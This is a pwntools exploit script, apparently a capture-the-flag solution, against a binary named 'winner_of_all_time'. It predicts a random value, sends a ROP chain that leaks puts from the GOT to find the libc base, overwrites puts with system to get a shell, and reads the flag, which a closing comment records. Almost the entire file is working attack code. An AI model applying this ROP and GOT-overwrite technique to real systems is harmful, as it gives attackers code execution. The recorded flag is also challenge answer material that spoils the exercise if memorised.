#!/usr/bin/env python3
from pwn import *

# helper
def str2hex(str):
    return int('0x' + str.encode()[::-1].hex(), 16)

context.terminal = 'wt.exe sp -d . wsl.exe -d Ubuntu'.split()
context.arch = 'amd64'
host, port = 'nc 157.245.147.89 21086'.split()[1:]
port = int(port)
e = ELF('./winner_of_all_time_patched')
lib = ELF('./libc.so.6', checksec=False)

script = """
b* 0x0000000004016DF
c
"""

if args.REMOTE:
    p = remote(host, port)
elif args.GDB:
    p = gdb.debug(e.path, gdbscript=script, aslr=False)
else:
    p = process(e.path)

p_ = process('./time_patched')
randnum = int(p_.recvline())
p_.close()
info(hex(randnum))

for i in range(0xb8//8):
    p.sendlineafter(b']: ', b'0')

rdi = 0x00401598
rsi_r15 = 0x00401596
lld = 0x00000000040270F 
main = 0x00000000040159D
ret = 0x004016ec
timeline_num = 0x0000000004040D8
ropchain = [
            rdi, e.got.puts, e.plt.puts, ret,
            rdi, lld, rsi_r15, e.bss()+0x400, 0, e.plt.__isoc99_scanf, 
            rdi, lld, rsi_r15, e.got.puts, 0, e.plt.__isoc99_scanf, ret, 
            rdi, e.bss()+0x400, e.plt.puts,
                ]
for gadget in ropchain:
    p.sendlineafter(b']: ', str(gadget).encode())

p.sendlineafter(b']: ', str(randnum%123456789).encode())
p.recvline()
info(hex(lib.sym.puts))
lib.address = u64(p.recv(6) + b'\x00\x00') - lib.sym.puts
info("lib " + hex(lib.address))

p.sendline(str(str2hex('/bin/sh')).encode())
p.sendline(str(str2hex('sh')).encode())
p.sendline(str(lib.sym.system).encode())
p.sendline(b'cat f*')

p.interactive()

# W1{y0u_4re_th3_m4ster_0f_t1me_a74339cebadb641d4c442ef08f45b945}